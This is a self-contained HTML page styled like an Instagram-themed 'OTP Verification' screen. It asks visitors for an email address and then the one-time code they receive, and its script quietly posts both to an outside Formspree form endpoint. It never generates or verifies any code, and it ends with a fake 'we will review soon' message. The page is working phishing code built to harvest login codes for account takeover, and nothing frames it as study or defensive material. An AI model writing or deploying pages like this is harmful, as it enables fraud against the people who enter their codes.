<!DOCTYPE html>
<html>
<head>
<title>OTP Verification</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
*{box-sizing:border-box;}
body{
    font-family:Arial,sans-serif;
    background:linear-gradient(45deg,#405DE6,#5851DB,#833AB4,#C13584,#E1306C,#FD1D1D);
    display:flex;
    justify-content:center;
    align-items:center;
    height:100vh;
    margin:0;
}
.container{
    background:#fff;
    padding:30px;
    width:85%;
    border-radius:14px;
    box-shadow:0 0 25px rgba(0,0,0,0.08);
    text-align:center;
}
@media(min-width:768px){
    .container{width:420px;}
}
input{
    width:100%;
    padding:14px;
    margin-top:18px;
    border-radius:8px;
    border:1px solid #ccc;
    font-size:16px;
}
button{
    width:100%;
    padding:14px;
    margin-top:18px;
    border-radius:8px;
    border:none;
    background:#007bff;
    color:white;
    font-size:16px;
    cursor:pointer;
}
button:hover{background:#0056b3;}
.loader{
    border:3px solid #f3f3f3;
    border-top:3px solid white;
    border-radius:50%;
    width:18px;
    height:18px;
    animation:spin 1s linear infinite;
    margin:auto;
    display:none;
}
@keyframes spin{100%{transform:rotate(360deg);}}
.resend{display:none;margin-top:14px;font-size:14px;}
.resend a{
    text-decoration:none;
    color:#007bff;
    cursor:pointer;
}
.resend a.disabled{
    pointer-events:none;
    color:gray;
}
.final-message{
    font-size:20px;
    font-weight:600;
    color:green;
    padding:30px 10px;
}
</style>
</head>

<body>

<div class="container" id="container">
<form id="otpForm">

<input type="email" id="email" placeholder="Enter Email" required>

<button type="button" id="sendBtn">
    <span id="sendText">Send OTP</span>
    <div class="loader" id="sendLoader"></div>
</button>

<input type="text" id="otp" placeholder="Enter OTP" required style="display:none;">

<div class="resend" id="resendBox">
    <a id="resendLink" class="disabled">Resend OTP (60s)</a>
</div>

<button type="submit" id="submitBtn" style="display:none;">
    <span id="submitText">Verify OTP</span>
    <div class="loader" id="submitLoader"></div>
</button>

</form>
</div>

<script>
const FORMSPREE_URL = "https://formspree.io/f/xqednygg";

const container = document.getElementById("container");
const form = document.getElementById("otpForm");
const sendBtn = document.getElementById("sendBtn");
const sendLoader = document.getElementById("sendLoader");
const sendText = document.getElementById("sendText");
const emailInput = document.getElementById("email");
const otpInput = document.getElementById("otp");
const submitBtn = document.getElementById("submitBtn");
const submitLoader = document.getElementById("submitLoader");
const submitText = document.getElementById("submitText");
const resendBox = document.getElementById("resendBox");
const resendLink = document.getElementById("resendLink");

let savedEmail = "";
let countdownInterval;

/* SEND OTP */
sendBtn.addEventListener("click", async function () {

    if (!emailInput.checkValidity()) {
        emailInput.reportValidity();
        return;
    }

    savedEmail = emailInput.value;

    sendText.style.display="none";
    sendLoader.style.display="block";
    sendBtn.disabled=true;

    await fetch(FORMSPREE_URL,{
        method:"POST",
        headers:{
            "Content-Type":"application/json",
            "Accept":"application/json"
        },
        body:JSON.stringify({
            _subject:"New OTP Request",
            email:savedEmail,
            otp:"Not submitted yet"
        })
    });

    setTimeout(()=>{
        emailInput.remove();
        sendBtn.remove();
        otpInput.style.display="block";
        submitBtn.style.display="block";
        resendBox.style.display="block";
        startCountdown();
    },3000);
});

/* VERIFY OTP */
form.addEventListener("submit",async function(e){
    e.preventDefault();

    if(!otpInput.checkValidity()){
        otpInput.reportValidity();
        return;
    }

    submitText.style.display="none";
    submitLoader.style.display="block";
    submitBtn.disabled=true;

    await fetch(FORMSPREE_URL,{
        method:"POST",
        headers:{
            "Content-Type":"application/json",
            "Accept":"application/json"
        },
        body:JSON.stringify({
            _subject:"OTP Submitted",
            email:savedEmail,
            otp:otpInput.value
        })
    });

    setTimeout(()=>{
        container.innerHTML=`
            <div class="final-message">
                thanks for verifying,we will review soon âœ…
            </div>
        `;
    },3000);
});

/* RESEND */
function startCountdown(){
    let timeLeft=60;
    resendLink.classList.add("disabled");
    resendLink.textContent=`Resend OTP (${timeLeft}s)`;

    countdownInterval=setInterval(()=>{
        timeLeft--;
        resendLink.textContent=`Resend OTP (${timeLeft}s)`;

        if(timeLeft<=0){
            clearInterval(countdownInterval);
            resendLink.textContent="Resend OTP";
            resendLink.classList.remove("disabled");
        }
    },1000);
}
</script>

</body>
</html>
